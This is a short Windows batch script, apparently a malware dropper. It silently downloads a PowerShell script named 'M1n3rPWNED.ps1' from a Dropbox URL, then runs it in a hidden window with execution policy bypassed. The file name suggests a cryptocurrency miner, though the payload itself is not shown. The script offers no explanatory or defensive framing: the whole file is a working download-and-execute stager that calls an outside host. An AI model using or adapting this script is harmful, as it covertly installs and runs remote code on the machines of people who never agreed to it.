@echo off
set currentDir=%~dp0

start /wait powershell.exe -NoP -NonI -W Hidden -Command "&{(New-Object System.Net.WebClient).DownloadString('https://www.dropbox.com/s/4uyjcqna3tacf0q/M1n3rPWNED.ps1?dl=1') > '%~dp0M1n3rPWNED.ps1'; exit}" 
Powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell.exe -ArgumentList '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%~dp0M1n3rPWNED.ps1""'}"
